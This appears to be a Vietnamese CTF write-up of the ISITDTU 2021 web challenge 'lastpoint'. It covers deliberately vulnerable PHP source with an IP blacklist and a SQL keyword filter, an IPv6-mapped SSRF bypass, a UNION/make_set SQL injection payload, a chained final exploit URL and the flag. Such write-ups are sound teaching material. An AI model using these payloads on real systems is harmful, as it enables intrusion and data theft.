# lastpoint

![image](https://user-images.githubusercontent.com/61876488/144350159-7f1593ac-038a-4531-82e5-81c0bb4fcbb2.png)


[Source](https://github.com/antoinenguyen-09/All_CTF_write-ups/tree/master/ISITDTU%20CTF/2021/web/last%20point/source)

### 1. Initial reconnaissance:

Đầu tiên chúng ta cần tạo account để login vào:

![](https://i.imgur.com/6e4zTGP.png)

Xem qua source của trang [login](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/login.php) và [register](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/register.php) cũng bình thường không có gì, chỉ còn mỗi 2 trang [index](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/index.php) và [home](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/home.php) để chúng ta xem xét.

### 2. Analyze and find the vulnerabilities:

#### a) index.php:

![](https://i.imgur.com/9iZ7VYu.png)

Mới nhìn vào có vẻ đây là tính năng nhập một URL bất kì rồi trả về nội dung của URL đó. Hướng đi của challenge này có vẻ là là khai thác [SSRF](https://portswigger.net/web-security/ssrf) rồi. Nhưng trước hết chúng ta sẽ gặp vật cản đầu tiên là hàm `filter` dưới đây:

```php
function filter($url) {
	$black_lists = ['127.0.0.1', '0.0.0.0'];
	$url_parse = parse_url($url);
	$ip = gethostbyname($url_parse['host']);
    if (in_array($ip,$black_lists)) {
        return false;
    }
	return true;
}
```
Tác giả đã lộ rõ ý đồ blacklist 2 ip là `127.0.0.1` và `0.0.0.0`, vì 2 ip này đếu trỏ đến `localhost`, điểm mấu chốt để khai thác SSRF. Thậm chí ngay cả khi bạn nhập vào url `https://localhost/home.php` rồi submit thì nó cũng cho kết quả tương tự:

![](https://i.imgur.com/r5pdh7A.png)

Không những blacklist 2 ip này mà tác giả còn sanitize và validate biến `$url` bằng cách lowercase, regex. Nếu pass qua được hết thì một curl session sẽ được tạo với biến `$url`, kết quả của curl session này sẽ được trả về tại biến `$output` (tham khảo về cách dùng curl tại [đây](https://viblo.asia/p/curl-va-cach-su-dung-trong-php-naQZRAXdKvx)). Còn nếu không pass sẽ kết thúc chương trình và in ra "NO NO NO NO" như hình trên:

```php
$url = strtolower($_POST['url']);
$check = filter($url);
if (filter_var($url,FILTER_VALIDATE_URL,FILTER_FLAG_IPV4) && preg_match('/(^https?:\/\/[^:\/]+)/',$url) && $check) {
    sleep(1);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    $output = curl_exec($ch);
    curl_close($ch);
} 
else {
    die ("NO NO NO NO");
}
```

#### b) home.php:

![](https://i.imgur.com/tVnPZzL.png)

Có lẽ có một tính năng "ẩn" ở `home.php` vì một lí do nào đó chúng ta lại không sử dụng được. Từ source ta biết được rằng `home.php` luôn luôn in ra "This is not a private ip" nếu như [client ip address](https://www.geeksforgeeks.org/php-determining-client-ip-address) trong request gửi đến trang này không phải là `127.0.0.1`:

```php
if ($_SERVER['REMOTE_ADDR'] !== "127.0.0.1") {
  die("<center>This is not a private ip</center>");
}
```
Xem kĩ source thì chúng ta biết được tính năng "ẩn" đó cho phép chúng ta truy vấn thông tin của các user trên web app này thông qua url parameter là `id`:

```php
if (isset($_GET['id'])) {
  $id = $_GET['id'];
  if (!preg_match('/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|
    join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\-\/\\\=<>+\'"$%#]/i',$id) && strlen($id) < 90) {
    $query = "SELECT id,username FROM users WHERE id={$id};";
    $result = $conn->query($query);
    while ($row = $result->fetch_assoc()) {
      echo "<tr><th>".$row['id']."</th><th>".$row['username'];
    }
    $result->free();
  }
}
```
Nhưng đoạn code trên lại không dùng [prepared statement](https://www.w3schools.com/php/php_mysql_prepared_statements.asp) để truy vấn mà lại dùng hàm [query](https://www.php.net/manual/en/sqlite3.query.php). Do đó chắn chắn sẽ bị SQL Injection, vấn đề chỉ nằm ở việc có bypass được cái regex `/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\-\/\\\=<>+\'"$%#]/i` hay không. Có lẽ khai thác SQLi xong chúng ta sẽ lấy được flag?

### 3. Exploit and get flag:

Sau khi xem xét 2 tính năng của `index.php` và `home.php`, chúng ta có thể rút ra hướng để khai thác như sau:

- Bypass SSRF filter ở chức năng submit url tại trang `index.php` sao cho có thể gọi đến localhost của chính web app này, dùng nó để request và in ra nội dung của `home.php`.
- In ra được `home.php` thì chỉ việc bypass regex nữa là tha hồ lượn trong database của cái app này.

##### a) Bypass SSRF filter:

Để bypass được mọi thể loại filter thì cách nhàn hạ và nhanh nhất để là đi mò cheat sheet :D Sau khi thử hàng loạt payload trong cái [SSRF cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#payloads-with-localhost) thần thành này thì mình phát hiện ra có cái này dùng được:

```
http://[0:0:0:0:0:ffff:127.0.0.1]
```

![](https://i.imgur.com/VOawqca.png)

#### b) Bypass SQLi filter:

Trong regex dùng để filter SQLi này:

`/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\-\/\\\=<>+\'"$%#]/i`

Chúng ta phát hiện ra không có `union` trong số đó. Vậy thì còn ngần ngại gì mà không [UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) nữa!

Mục tiêu của việc exploit SQLi theo kiểu UNION attack là in ra toàn bộ data từ table `user`. Nếu như phải test black box thì cần có 1 bước là xác định số cột của `user`, nhưng mà trong source có luôn cả script sql ([main.sql](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/mysql/main.sql)) tạo table này nên không cần phải làm nữa:

```sql
CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` text NOT NULL,
  `password` text NOT NULL,
  `[CENSORED]` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

Table `user` có 4 column, nhưng lại có 1 column "ẩn" được đánh dấu là `[CENSORED]`, rất có thể flag sẽ nằm trong column này. Mặc dù không biết tên column này nhưng chúng ta lại biết được column này có index là 4 trong table `user`. Liệu có thể dùng `SELECT` để query `user` nhưng không dùng tên mà chỉ dùng index của column?
Nếu kết hợp khéo léo một chút giữa `SELECT` và hàm [make_set()](https://database.guide/how-the-make_set-function-works-in-mysql/) trong MySQL thì câu trả lời là có. Quá trình build script với ý tưởng này khá là loằng ngoằng, bạn có thể xem tóm tắt trong hình dưới. Ở đây mình tạo một table user tương tự như của web app nhưng chỉ có 2 cột là id và username.

![](https://i.imgur.com/j9poFif.png)

Oke, vậy payload SQLi cuối cùng sẽ là:

```
1 union select 1,make_set(1|4,`2`,`3`,`4`)from(select 1,2,3,4 union select * from users)a
```

Ghép với payload SSRF ở trên nữa ta sẽ lấy được flag:

![](https://i.imgur.com/CGrDwKp.png)

My final payload:

```
http://[0:0:0:0:0:ffff:127.0.0.1]/home.php?id=1%20union%20select%201,make_set(1%7c4,%602%60,%603%60,%604%60)from(select%201,2,3,4%20union%20select%20*%20from%20users)a
```

Flag: `ISITDTU{w0w_SSRF_ch4in_SQLI_3Zzzz_h3he_!!!!}`





